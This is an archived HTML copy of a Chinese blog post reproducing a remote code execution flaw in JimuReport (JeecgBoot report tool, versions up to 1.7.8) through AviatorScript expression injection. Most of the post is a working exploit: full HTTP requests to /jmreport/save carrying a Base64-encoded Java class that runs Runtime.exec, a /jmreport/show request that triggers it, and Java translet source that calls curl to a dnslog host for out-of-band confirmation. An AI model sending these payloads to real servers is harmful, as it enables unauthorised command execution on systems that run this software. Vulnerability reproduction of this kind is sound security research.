@@ -1,0 +1,205 @@
+<!DOCTYPE html> <html lang="zh-cn"><head>
+<title>JeecgBoot积木报表AviatorScript表达式注入漏洞复现</title>
+<base href="..">
+<meta name="pathname" content="ObsidianWebClipper/JeecgBoot积木报表AviatorScript表达式注入漏洞复现.html">
+<meta name="description" content="Wiki - JeecgBoot积木报表AviatorScript表达式注入漏洞复现">
+<meta property="og:title" content="JeecgBoot积木报表AviatorScript表达式注入漏洞复现">
+<meta property="og:description" content="Wiki - JeecgBoot积木报表AviatorScript表达式注入漏洞复现">
+<meta property="og:type" content="website">
+<meta property="og:url" content="ObsidianWebClipper/JeecgBoot积木报表AviatorScript表达式注入漏洞复现.html">
+<meta property="og:image" content="https://img2024.cnblogs.com/blog/2855436/202409/2855436-20240902143650937-547414405.png">
+<meta charset="UTF-8"><meta property="og:site_name" content="Wiki"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes, minimum-scale=1.0, maximum-scale=5.0"><script async="" id="webpage-script" src="site-lib/scripts/webpage.js" onload="this.onload=null;this.setAttribute(&quot;loaded&quot;, &quot;true&quot;)"></script><link rel="icon" href="site-lib/media/favicon.png"><link rel="stylesheet" href="site-lib/styles/obsidian.css"><link rel="preload" href="site-lib/styles/global-variable-styles.css" as="style" onload="this.onload=null;this.rel='stylesheet'"><noscript><link rel="stylesheet" href="site-lib/styles/global-variable-styles.css"></noscript><link rel="preload" href="site-lib/styles/main-styles.css" as="style" onload="this.onload=null;this.rel='stylesheet'"><noscript><link rel="stylesheet" href="site-lib/styles/main-styles.css"></noscript><style>body{--line-width:40em;--line-width-adaptive:40em;--file-line-width:40em;--sidebar-width:min(20em, 80vw);--collapse-arrow-size:11px;--tree-vertical-spacing:1.3em;--sidebar-margin:12px}:root{background-color:#202124}.sidebar{height:100%;font-size:14px;z-index:10;min-width:calc(var(--sidebar-width) + var(--divider-width-hover));max-width:calc(var(--sidebar-width) + var(--divider-width-hover));position:relative;overflow:hidden;overflow:clip;transition:min-width ease-in-out,max-width ease-in-out;transition-duration:.2s;contain:size}#left-sidebar{left:0}#right-sidebar{right:0}.sidebar.is-collapsed{min-width:0;max-width:0}.sidebar.floating{position:absolute}.sidebar .leaf-content{height:100%;min-width:calc(var(--sidebar-width) - var(--divider-width-hover));top:0;padding:var(--sidebar-margin);padding-top:4em;line-height:var(--line-height-tight);background-color:var(--background-secondary);transition:background-color,border-right,border-left,box-shadow;transition-duration:var(--color-fade-speed);transition-timing-function:ease-in-out;position:absolute;display:flex;flex-direction:column}.sidebar:not(.is-collapsed) .leaf-content{min-width:calc(max(100%,var(--sidebar-width)) - 3px);max-width:calc(max(100%,var(--sidebar-width)) - 3px)}#left-sidebar-content{left:0;border-top-right-radius:var(--radius-l);border-bottom-right-radius:var(--radius-l)}#right-sidebar-content{right:0;border-top-left-radius:var(--radius-l);border-bottom-left-radius:var(--radius-l)}.sidebar #left-sidebar-content,.sidebar #right-sidebar-content{contain:none!important;container-type:normal!important;animation:none!important}.sidebar:has(.leaf-content:empty):has(.topbar-content:empty){display:none}.sidebar-topbar{height:calc(2.3em + 2 * var(--sidebar-margin));width:var(--sidebar-width);padding:var(--sidebar-margin);z-index:1;position:fixed;display:flex;align-items:center;transition:width ease-in-out;transition-duration:inherit}.sidebar.is-collapsed .sidebar-topbar{width:calc(2.3em + var(--sidebar-margin) * 2)}.sidebar .sidebar-topbar.is-collapsed{width:0}#left-sidebar .sidebar-topbar{left:0;flex-direction:row;border-top-right-radius:var(--radius-l)}#right-sidebar .sidebar-topbar{right:0;flex-direction:row-reverse;border-top-left-radius:var(--radius-l)}#left-sidebar .topbar-content{margin-right:calc(2.3em + var(--sidebar-margin));flex-direction:row}#right-sidebar .topbar-content{margin-left:calc(2.3em + var(--sidebar-margin));flex-direction:row-reverse}.topbar-content{overflow:hidden visible;overflow:clip visible;width:100%;height:100%;display:flex;align-items:center;transition:inherit}.sidebar.is-collapsed .topbar-content{width:0;transition:inherit}.clickable-icon.sidebar-collapse-icon{background-color:transparent;color:var(--icon-color-focused);padding:2px!important;margin:0!important;height:100%!important;width:2.3em!important;margin-inline:0.14em!important;position:absolute}#left-sidebar .clickable-icon.sidebar-collapse-icon{transform:rotateY(180deg);right:var(--sidebar-margin)}#right-sidebar .clickable-icon.sidebar-collapse-icon{transform:rotateY(180deg);left:var(--sidebar-margin)}.clickable-icon.sidebar-collapse-icon svg.svg-icon{width:100%;height:100%}.feature-title{margin-left:1px;text-transform:uppercase;letter-spacing:.06em;margin-top:.75em;margin-bottom:.75em}.feature-header{display:flex;align-items:center;padding-top:0;font-size:1em;padding-left:0}body.floating-sidebars .sidebar{position:absolute}body{transition:background-color var(--color-fade-speed) ease-in-out}#navbar:not(:empty){display:flex;align-items:center;justify-content:space-between;padding:.5em 1em;width:100%}#main{display:flex;flex-direction:column;height:100%;width:100%;align-items:stretch;justify-content:center}#main-horizontal{display:flex;flex-direction:row;flex-grow:1;width:100%;align-items:stretch;justify-content:center}#center-content{flex-basis:100%;max-width:100%;width:100%;height:100%;display:flex;flex-direction:column;align-items:center;transition:opacity .2s ease-in-out;contain:inline-size}.hide{opacity:0!important;transition:opacity .2s ease-in-out;pointer-events:none}#center-content>.obsidian-document{padding-left:2em;padding-right:1em;margin-bottom:0;width:100%;width:-webkit-fill-available;width:-moz-available;width:fill-available;transition:background-color var(--color-fade-speed) ease-in-out;border-top-right-radius:var(--window-radius,var(--radius-m));border-top-left-radius:var(--window-radius,var(--radius-m));overflow-x:hidden!important;overflow-y:auto!important;display:flex!important;flex-direction:column!important;align-items:center!important;contain:inline-size}body #center-content>.obsidian-document>.markdown-preview-sizer{padding-bottom:80vh;width:100%;max-width:var(--line-width);flex-basis:var(--line-width);transition:background-color var(--color-fade-speed) ease-in-out;contain:inline-size}#center-content>.obsidian-document>div{width:100%!important;transition:background-color var(--color-fade-speed) ease-in-out;contain:inline-size}#center-content>.obsidian-document:not([data-type=markdown]).embed{display:flex;padding:1em;height:100%;width:100%;align-items:center;justify-content:center}#center-content>.obsidian-document:not([data-type=markdown]).embed>*{max-width:100%;max-height:100%;object-fit:contain}:not(h1,h2,h3,h4,h5,h6,li):has(> :is(.math,table)){overflow-x:auto!important}#center-content>.obsidian-document:not([data-type=markdown]){overflow-x:auto;contain:content;padding:0;margin:0;height:100%}.obsidian-document[data-type=attachment]{display:flex;flex-direction:column;align-items:center;justify-content:center;height:100%;width:100%}.obsidian-document[data-type=attachment]>*{outline:0;border:none;box-shadow:none}.obsidian-document[data-type=attachment] :is(img){max-width:90%;max-height:90%;object-fit:contain}.obsidian-document[data-type=attachment]>:is(audio){width:100%;max-width:min(90%,var(--line-width))}.obsidian-document[data-type=attachment]>:is(embed,iframe,video){width:100%;height:100%;max-width:100%;max-height:100%;object-fit:contain}.canvas-wrapper>:is(.header,.footer){z-index:100;position:absolute;display:flex;justify-content:center;flex-direction:column;width:100%;align-items:center}.scroll-highlight{position:absolute;width:100%;height:100%;pointer-events:none;z-index:1000;background-color:hsla(var(--color-accent-hsl),.25);opacity:0;padding:1em;inset:50%;translate:-50% -50%;border-radius:var(--radius-s)}</style><script defer="">async function loadIncludes(){let e=document.querySelectorAll("link[itemprop='include']");for(const t of e){let e=t.getAttribute("href");try{let o="";if(e.startsWith("https:")||e.startsWith("http:")||"file:"!=window.location.protocol){const n=await fetch(e);if(!n.ok){console.log("Could not include file: "+e),t?.remove();continue}o=await n.text()}else{const t=document.getElementById(btoa(encodeURI(e)));if(t){const e=JSON.parse(decodeURI(atob(t.getAttribute("value")??"")));o=e?.data??""}}let n=document.createRange().createContextualFragment(o);t.before(n),t.remove(),console.log("Included text: "+o),console.log("Included file: "+e)}catch(o){t?.remove(),console.log("Could not include file: "+e,o);continue}}}document.addEventListener("DOMContentLoaded",(()=>{loadIncludes()}));let isFileProtocol="file:"==location.protocol;function waitLoadScripts(e,t){let o=e.map((e=>document.getElementById(e+"-script")));!function e(n){let l=o[n],c=n+1;l?(l&&"true"!=l.getAttribute("loaded")||n<o.length&&e(c),n<o.length&&l.addEventListener("load",(()=>e(c)))):n<o.length?e(c):t()}(0)}</script></head><body class="publish css-settings-manager styled-scrollbars show-inline-title show-ribbon is-focused"><script defer="">let theme=localStorage.getItem("theme")||(window.matchMedia("(prefers-color-scheme: dark)").matches?"dark":"light");"dark"==theme?(document.body.classList.add("theme-dark"),document.body.classList.remove("theme-light")):(document.body.classList.add("theme-light"),document.body.classList.remove("theme-dark")),window.innerWidth<480?document.body.classList.add("is-phone"):window.innerWidth<768?document.body.classList.add("is-tablet"):window.innerWidth<1024?document.body.classList.add("is-small-screen"):document.body.classList.add("is-large-screen")</script><div class="parsed-feature-container" style="display: contents;"><link itemprop="include" href="site-lib/html/custom-head-content-content.html"></div><div id="main"><div id="navbar"></div><div id="main-horizontal"><div id="left-content" class="leaf" style="--sidebar-width: var(--sidebar-width-left);"></div><div id="center-content" class="leaf"><div class="obsidian-document markdown-preview-view markdown-rendered node-insert-event is-readable-line-width allow-fold-headings allow-fold-lists show-indentation-guide show-properties" data-type="markdown"><style id="MJX-CHTML-styles"></style><pre class="frontmatter language-yaml" style="display: none;"><code class="language-yaml is-loaded"><span class="token key atrule">title</span><span class="token punctuation">:</span> <span class="token string">"JeecgBoot积木报表AviatorScript表达式注入漏洞复现"</span>
+<span class="token key atrule">source</span><span class="token punctuation">:</span> <span class="token string">"https://www.cnblogs.com/CVE-Lemon/p/18392679"</span></code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre><div class="markdown-preview-sizer markdown-preview-section"><div class="header"><h1 class="page-title heading inline-title" id="JeecgBoot积木报表AviatorScript表达式注入漏洞复现_0">JeecgBoot积木报表AviatorScript表达式注入漏洞复现</h1><div class="data-bar"></div></div><div class="markdown-preview-pusher" style="width: 1px; height: 0.1px; margin-bottom: 0px;"></div><div class="el-p"><p dir="auto"><a data-tooltip-position="top" aria-label="https://www.cnblogs.com/CVE-Lemon/collections/11743" rel="noopener nofollow" class="external-link is-unresolved" href="https://www.cnblogs.com/CVE-Lemon/collections/11743" target="_self">合集 - 漏洞复现(2)</a></p></div><div class="el-ol"><ol>
+<li data-line="0" dir="auto"></li>
+</ol></div><div class="el-p"><p dir="auto"><a data-tooltip-position="top" aria-label="https://www.cnblogs.com/CVE-Lemon/p/18789173" rel="noopener nofollow" class="external-link is-unresolved" href="https://www.cnblogs.com/CVE-Lemon/p/18789173" target="_self">2.CVE-2025-29927 Next.js 中间件权限绕过漏洞复现</a></p></div><div class="el-h2"><h2 data-heading="漏洞信息" dir="auto" class="heading" id="漏洞信息_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>漏洞信息</h2></div><div class="el-p"><p dir="auto">影响组件：JimuReport积木报表</p></div><div class="el-p"><p dir="auto">影响版本：v1.6.0 ＜ JimuReport ≤ 1.7.8</p></div><div class="el-p"><p dir="auto">漏洞名称：AviatorScript表达式注入漏洞</p></div><div class="el-p"><p dir="auto">漏洞链接： <a data-tooltip-position="top" aria-label="https://github.com/jeecgboot/JimuReport/issues/2848" rel="noopener nofollow" class="external-link is-unresolved" href="https://github.com/jeecgboot/JimuReport/issues/2848" target="_self">积木报表软件存在AviatorScript代码注入RCE漏洞 · Issue #2848</a></p></div><div class="el-p"><p dir="auto">漏洞描述：</p></div><div class="el-p"><p dir="auto">积木报表软件存在AviatorScript代码注入RCE漏洞</p></div><div class="el-p"><p dir="auto">使用接口/jmreport/save处在text中写入AviatorScript表达式访问/jmreport/show触发AviatorScript解析从而导致命令执行。</p></div><div class="el-h2"><h2 data-heading="漏洞复现" dir="auto" class="heading" id="漏洞复现_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>漏洞复现</h2></div><div class="el-h3"><h3 data-heading="环境搭建" dir="auto" class="heading" id="环境搭建_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>环境搭建</h3></div><div class="el-p"><p dir="auto">使用积木报表v1.7.8复现，下载链接： <a data-tooltip-position="top" aria-label="https://github.com/jeecgboot/JimuReport/releases/tag/v1.7.8" rel="noopener nofollow" class="external-link is-unresolved" href="https://github.com/jeecgboot/JimuReport/releases/tag/v1.7.8" target="_self">Release v1.7.8 · jeecgboot/JimuReport</a></p></div><div class="el-p"><p dir="auto">用idea打开，使用maven下载依赖之后，运行com.jeecg.modules.JimuReportApplication访问 <a rel="noopener nofollow" class="external-link is-unresolved" href="http://192.168.171.1:8085/" target="_self">http://192.168.171.1:8085/</a> ，搭建成功：</p></div><div class="el-p"><p dir="auto"><a data-tooltip-position="top" aria-label="https://img2024.cnblogs.com/blog/2855436/202409/2855436-20240902143650937-547414405.png" rel="noopener nofollow" class="external-link is-unresolved" href="https://img2024.cnblogs.com/blog/2855436/202409/2855436-20240902143650937-547414405.png" target="_self"><img src="https://img2024.cnblogs.com/blog/2855436/202409/2855436-20240902143650937-547414405.png" referrerpolicy="no-referrer" target="_self" class="is-unresolved"></a></p></div><div class="el-h3"><h3 data-heading="poc复现" dir="auto" class="heading" id="poc复现_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>poc复现</h3></div><div class="el-p"><p dir="auto">poc来源： <a data-tooltip-position="top" aria-label="https://github.com/wy876/POC/blob/main/JeecgBoot/JeecgBoot%E7%B3%BB%E7%BB%9FAviatorScript%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md" rel="noopener nofollow" class="external-link is-unresolved" href="https://github.com/wy876/POC/blob/main/JeecgBoot/JeecgBoot%E7%B3%BB%E7%BB%9FAviatorScript%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md" target="_self">https://github.com/wy876/POC/blob/main/JeecgBoot/JeecgBoot系统AviatorScript表达式注入漏洞.md</a></p></div><div class="el-pre"><pre><code data-line="0">POST /jeecg-boot/jmreport/save?previousPage=xxx&amp;jmLink=YWFhfHxiYmI=&amp;token=123 HTTP/1.1
+Host: 192.168.37.1:8088
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: application/json, text/plain, */*
+Content-Type: application/json
+Content-Length: 3456
+
+{
+    "loopBlockList": [],
+    "area": false,
+    "printElWidth": 718,
+    "excel_config_id": "980882669965455363",
+    "printElHeight": 1047,
+    "rows": {
+        "4": {
+            "cells": {
+                "4": {
+                    "text": "=(use org.springframework.cglib.core.*;use org.springframework.util.*;ReflectUtils.defineClass('test', Base64Utils.decodeFromString('yv66vgAAADQANgoACQAlCgAmACcIACgKACYAKQcAKgcAKwoABgAsBwAtBwAuAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAZMdGVzdDsBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcALwEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAIPGNsaW5pdD4BAAFlAQAVTGphdmEvaW8vSU9FeGNlcHRpb247AQANU3RhY2tNYXBUYWJsZQcAKgEAClNvdXJjZUZpbGUBAAl0ZXN0LmphdmEMAAoACwcAMAwAMQAyAQAEY2FsYwwAMwA0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAGmphdmEvbGFuZy9SdW50aW1lRXhjZXB0aW9uDAAKADUBAAR0ZXN0AQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABgoTGphdmEvbGFuZy9UaHJvd2FibGU7KVYAIQAIAAkAAAAAAAQAAQAKAAsAAQAMAAAALwABAAEAAAAFKrcAAbEAAAACAA0AAAAGAAEAAAAJAA4AAAAMAAEAAAAFAA8AEAAAAAEAEQASAAIADAAAAD8AAAADAAAAAbEAAAACAA0AAAAGAAEAAAAWAA4AAAAgAAMAAAABAA8AEAAAAAAAAQATABQAAQAAAAEAFQAWAAIAFwAAAAQAAQAYAAEAEQAZAAIADAAAAEkAAAAEAAAAAbEAAAACAA0AAAAGAAEAAAAbAA4AAAAqAAQAAAABAA8AEAAAAAAAAQATABQAAQAAAAEAGgAbAAIAAAABABwAHQADABcAAAAEAAEAGAAIAB4ACwABAAwAAABmAAMAAQAAABe4AAISA7YABFenAA1LuwAGWSq3AAe/sQABAAAACQAMAAUAAwANAAAAFgAFAAAADQAJABAADAAOAA0ADwAWABEADgAAAAwAAQANAAkAHwAgAAAAIQAAAAcAAkwHACIJAAEAIwAAAAIAJA=='), ClassLoader.getSystemClassLoader());)",
+                    "style": 0
+                }
+            },
+            "height": 25
+        },
+        "len": 96,
+        "-1": {
+            "cells": {
+                "-1": {
+                    "text": "${gongsi.id}"
+                }
+            },
+            "isDrag": true
+        }
+    },
+    "dbexps": [],
+    "toolPrintSizeObj": {
+        "printType": "A4",
+        "widthPx": 718,
+        "heightPx": 1047
+    },
+    "dicts": [],
+    "freeze": "A1",
+    "dataRectWidth": 701,
+    "background": false,
+    "name": "sheet1",
+    "autofilter": {},
+    "styles": [
+        {
+            "align": "center"
+        }
+    ],
+    "validations": [],
+    "cols": {
+        "4": {
+            "width": 95
+        },
+        "len": 50
+    },
+    "merges": [
+        "E4:F4",
+        "B4:B5",
+        "C4:C5",
+        "D4:D5",
+        "G4:G5",
+        "H4:H5",
+        "I4:I5",
+        "D1:G1",
+        "H3:I3"
+    ]
+}
+</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-pre"><pre><code data-line="0">POST /jeecg-boot/jmreport/show?previousPage=xxx&amp;jmLink=YWFhfHxiYmI= HTTP/1.1
+Host: 192.168.37.1:8088
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: application/json, text/plain, */*
+Content-Type: application/json
+Content-Length: 42
+
+{
+    "id": "980882669965455363"
+}
+</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto">反编译poc里的字节码，可以看到是调用Runtime.getRuntime.exec来执行系统命令启动计算器：</p></div><div class="el-p"><p dir="auto"><a data-tooltip-position="top" aria-label="https://img2024.cnblogs.com/blog/2855436/202409/2855436-20240902143706666-655633058.png" rel="noopener nofollow" class="external-link is-unresolved" href="https://img2024.cnblogs.com/blog/2855436/202409/2855436-20240902143706666-655633058.png" target="_self"><img src="https://img2024.cnblogs.com/blog/2855436/202409/2855436-20240902143706666-655633058.png" referrerpolicy="no-referrer" target="_self" class="is-unresolved"></a></p></div><div class="el-p"><p dir="auto">发送poc，可以看到成功调用了计算器</p></div><div class="el-p"><p dir="auto"><a data-tooltip-position="top" aria-label="https://img2024.cnblogs.com/blog/2855436/202409/2855436-20240902143712756-1272263049.png" rel="noopener nofollow" class="external-link is-unresolved" href="https://img2024.cnblogs.com/blog/2855436/202409/2855436-20240902143712756-1272263049.png" target="_self"><img src="https://img2024.cnblogs.com/blog/2855436/202409/2855436-20240902143712756-1272263049.png" referrerpolicy="no-referrer" target="_self" class="is-unresolved"></a></p></div><div class="el-p"><p dir="auto"><a data-tooltip-position="top" aria-label="https://img2024.cnblogs.com/blog/2855436/202409/2855436-20240902143716524-490957072.png" rel="noopener nofollow" class="external-link is-unresolved" href="https://img2024.cnblogs.com/blog/2855436/202409/2855436-20240902143716524-490957072.png" target="_self"><img src="https://img2024.cnblogs.com/blog/2855436/202409/2855436-20240902143716524-490957072.png" referrerpolicy="no-referrer" target="_self" class="is-unresolved"></a></p></div><div class="el-h3"><h3 data-heading="DNSLog验证" dir="auto" class="heading" id="DNSLog验证_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>DNSLog验证</h3></div><div class="el-p"><p dir="auto">使用<a data-tooltip-position="top" aria-label="https://dnslog.org/%E8%8E%B7%E5%BE%97%E4%B8%80%E4%B8%AA%E5%9F%9F%E5%90%8D%EF%BC%9A" rel="noopener nofollow" class="external-link is-unresolved" href="https://dnslog.org/%E8%8E%B7%E5%BE%97%E4%B8%80%E4%B8%AA%E5%9F%9F%E5%90%8D%EF%BC%9A" target="_self">https://dnslog.org/获得一个域名：</a></p></div><div class="el-pre"><pre class="language-lua"><code data-line="0" class="language-lua is-loaded">jeecg<span class="token punctuation">.</span>e7b700c1<span class="token punctuation">.</span>log<span class="token punctuation">.</span>dnslog<span class="token punctuation">.</span>biz<span class="token punctuation">.</span>
+</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto">编写poc：</p></div><div class="el-pre"><pre class="language-java"><code data-line="0" class="language-java is-loaded"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span></span><span class="token class-name">DOM</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span></span><span class="token class-name">TransletException</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>runtime<span class="token punctuation">.</span></span><span class="token class-name">AbstractTranslet</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>dtm<span class="token punctuation">.</span></span><span class="token class-name">DTMAxisIterator</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>serializer<span class="token punctuation">.</span></span><span class="token class-name">SerializationHandler</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span>
+
+<span class="token keyword">public</span> <span class="token keyword">class</span> test1 <span class="token keyword">extends</span> <span class="token class-name">AbstractTranslet</span> <span class="token punctuation">{</span>
+   <span class="token keyword">public</span> <span class="token function">test1</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+   <span class="token punctuation">}</span>
+
+   <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">transform</span><span class="token punctuation">(</span><span class="token class-name">DOM</span> document<span class="token punctuation">,</span> <span class="token class-name">SerializationHandler</span><span class="token punctuation">[</span><span class="token punctuation">]</span> handlers<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">TransletException</span> <span class="token punctuation">{</span>
+   <span class="token punctuation">}</span>
+
+   <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">transform</span><span class="token punctuation">(</span><span class="token class-name">DOM</span> document<span class="token punctuation">,</span> <span class="token class-name">DTMAxisIterator</span> iterator<span class="token punctuation">,</span> <span class="token class-name">SerializationHandler</span> handler<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">TransletException</span> <span class="token punctuation">{</span>
+   <span class="token punctuation">}</span>
+
+   <span class="token keyword">static</span> <span class="token punctuation">{</span>
+      <span class="token keyword">try</span> <span class="token punctuation">{</span>
+         <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"curl jeecg.e7b700c1.log.dnslog.biz."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+      <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> var1<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+         <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span>var1<span class="token punctuation">)</span><span class="token punctuation">;</span>
+      <span class="token punctuation">}</span>
+   <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
